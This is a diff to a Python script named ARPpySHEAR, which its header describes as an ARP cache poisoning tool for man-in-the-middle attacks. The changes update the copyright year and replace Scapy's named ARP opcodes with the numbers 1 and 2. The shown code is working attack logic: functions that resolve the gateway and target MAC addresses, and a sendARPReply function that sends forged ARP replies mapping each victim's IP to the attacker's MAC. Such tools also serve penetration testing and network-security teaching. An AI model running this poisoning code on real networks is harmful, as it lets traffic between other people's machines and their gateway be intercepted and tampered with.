@@ -2,7 +2,7 @@
 # ARPpySHEAR is an ARP cache poisoning tool, 
 # created by student237 to be used in MITM attacks.
 # 
-# Copyright (c) 2019 Jesse Blier (student237)
+# Copyright (c) 2019-2020 Jesse Blier (student237)
 #
 # This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
@@ -160,7 +160,7 @@ def collectTargetIP(gateway, error, reset):
 #Function to request and return the gateway MAC address.
 def getGatewayMAC(gatewayIP):
 	try:
-		reqSnd = sr1(ARP(op = "who-has", pdst = gatewayIP), timeout = 0.5)
+		reqSnd = sr1(ARP(op = 1, pdst = gatewayIP), timeout = 0.5)
 		if reqSnd == "":
 			print("\nHost " + str(gatewayIP) + " not found. Exiting ARPpySHEAR...")
 			sys.exit(1)		
@@ -175,7 +175,7 @@ def getGatewayMAC(gatewayIP):
 #Function to request and return the target machine MAC address.
 def getTargetMAC(targetIP):
 	try:	
-		reqSnd = sr1(ARP(op = "who-has", pdst = targetIP), timeout = 0.5)
+		reqSnd = sr1(ARP(op = 1, pdst = targetIP), timeout = 0.5)
 		if reqSnd == "":
 			print("\nHost " + str(targetIP) + " not found. Exiting ARPpySHEAR...")
 			sys.exit(1)			
@@ -190,11 +190,11 @@ def getTargetMAC(targetIP):
 #Function to send ARP reply packets to the gateway and target machines.
 def sendARPReply(gatewayIP, gatewayMAC, targetIP, targetMAC):
 	#Send ARP reply to gatewayIP with targetIP and attacker MAC.
-	send(ARP(op = ARP.is_at, psrc = targetIP, hwdst = gatewayMAC, pdst = gatewayIP))
+	send(ARP(op = 2, psrc = targetIP, hwdst = gatewayMAC, pdst = gatewayIP))
 	print(" > ARPpySHEAR sent an ARP reply to " + str(gatewayIP) + ", mapping " + str(targetIP) + " to Attacker MAC")
 
 	#Send ARP reply to targetIP with gatewayIP and attacker MAC.
-	send(ARP(op = ARP.is_at, psrc = gatewayIP, hwdst = targetMAC, pdst = targetIP))
+	send(ARP(op = 2, psrc = gatewayIP, hwdst = targetMAC, pdst = targetIP))
 	print(" >> ARPpySHEAR sent an ARP reply to " + str(targetIP) + ", mapping " + str(gatewayIP) + " to Attacker MAC")
 
 	#Pause for one second. 
